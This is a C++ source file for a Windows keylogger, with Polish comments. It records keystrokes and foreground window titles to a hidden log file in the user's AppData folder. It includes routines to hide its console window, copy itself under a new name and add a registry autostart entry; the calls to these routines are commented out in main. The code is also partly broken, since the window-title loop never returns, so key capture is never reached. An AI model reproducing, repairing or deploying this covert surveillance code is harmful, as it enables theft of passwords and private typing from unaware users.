#include <iostream>
#include <windows.h>
#include <fstream>
#include <stdio.h>
#include <cstring>
using namespace std;
fstream logs;

const string SCIEZKA=getenv("APPDATA")+string("\\997.exe");
const string SCIEZKA_LOGOW = getenv("APPDATA")+string("\\logi.txt");

int i;
int vKey;
char okno2[80];
char nazwaOkna[80];
void doSystemu(string sciezkaKeylogger)
{
    string komenda = "copy "+sciezkaKeylogger+" "+SCIEZKA;
    cout << komenda<<endl;
    system(komenda.c_str());
}
void Konsola()//Ukrywanie si� konsoli
{
    FreeConsole();
}
void nazwaOkno()
{
    for(;;){
    HWND hwnd=GetForegroundWindow();
    int tymczasowa=GetWindowText(hwnd,nazwaOkna,80);
    Sleep(2000);
    int tymczasowa2=GetWindowText(hwnd,okno2,80);
    if(strcmp(nazwaOkna, okno2))
    {
        logs<<">---------------------"<<nazwaOkna<<"---------------------<"<<endl;
        cout<<nazwaOkna;
    }
    }
}
void Zapisz(int input)//Zapisywanie do pliku
{
    logs.open(SCIEZKA_LOGOW.c_str(), ios::app);
    if(logs.is_open())
    {
        logs<<(char)input;
        logs.close();
    }
    if(logs.good()==false)
    {
        logs<<"Error";
        exit(0);
    }
}
void ZapiszSPECIAL(string input)//Zapisywanie do pliku znak�w specjalnych
{
    logs.open(SCIEZKA_LOGOW.c_str(), ios::app);
    if(logs.is_open())
    {
        logs<<input;
        logs.close();
    }
    if(logs.good()==false)
    {
        logs<<"Error";
        exit(0);
    }
}
bool Mutex()
{
    CreateMutex(NULL, true, "d41d8cd98f00b204e9800998ecf8427ezakitokox");
    if(GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return true;
    }
    else
    {
        return false;
    }
}
void Autostart(string sciezka)//Dodawanie do autostartu
{
    string komenda = "reg ADD HKEY_CURRENT_USER\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run /v Test /f /t REG_SZ /d "+SCIEZKA;
    cout<<komenda;
    system(komenda.c_str());
    doSystemu(sciezka);

    if (sciezka!=SCIEZKA)
    {
        string komenda = "start "+SCIEZKA;
        system(komenda.c_str());
        exit(EXIT_SUCCESS);
    }
}
void Keylogger()
{
    while(true)
    {
        //Znaki
        for(i=65; i<91; i++)
        {
            vKey= GetAsyncKeyState(i);
            if(vKey&0x0001 && !GetAsyncKeyState(VK_SHIFT))
            {
                cout<<(char)(i+32);
                Zapisz(i+32);
            }
            else if(vKey&0x0001 && GetAsyncKeyState(VK_SHIFT))
            {
                cout<<(char)i;
                Zapisz(i);
            }
        }
        //Liczby
        for(i=48; i<58; i++)
        {
            vKey = GetAsyncKeyState(i);
            if(vKey&0x0001 && !GetAsyncKeyState(VK_SHIFT))
            {
                cout<<(char)i;
            }
        }
        //znaki specjalne
        if (GetAsyncKeyState(VK_RETURN)&0x0001)
        {
            cout << "[ENTER]";
            ZapiszSPECIAL("[ENTER]");
        }
        if (GetAsyncKeyState(VK_TAB)&0x0001)
        {
            cout << "[TAB]";
            ZapiszSPECIAL("[TAB]");

        }
        if (GetAsyncKeyState(VK_CONTROL)&0x0001)
        {
            cout << "[CTRL]";
            ZapiszSPECIAL("[CTRL]");
        }
        if (GetAsyncKeyState(VK_MENU)&0x0001)
        {
            cout << "[ALT]";
            ZapiszSPECIAL("[ALT]");
        }
        if (GetAsyncKeyState(VK_CAPITAL)&0x0001)
        {
            cout << "[CAPSLOCK]";
            ZapiszSPECIAL("[CAPS]");
        }
        if (GetAsyncKeyState(VK_ESCAPE)&0x0001)
        {
            cout << "[ESC]";
            ZapiszSPECIAL("[ESC]");
        }
        if (GetAsyncKeyState(VK_DELETE)&0x0001)
        {
            cout << "[DELETE]";
            ZapiszSPECIAL("[DEL]");
        }
        if (GetAsyncKeyState(VK_SPACE)&0x0001)
        {
            cout<<" ";
            Zapisz(32);
        }
        if (GetAsyncKeyState(VK_BACK)&0x0001)
        {
            cout<<"[BS]";
            ZapiszSPECIAL("[BS]");
        }
    }
}
int main(int argc, char * argv[])
{
    if (!Mutex())
    {
        //Konsola();
        //Sleep(4000);
        //Autostart(argv[0]);
        nazwaOkno();
        Keylogger();
    }
    return 0;
}
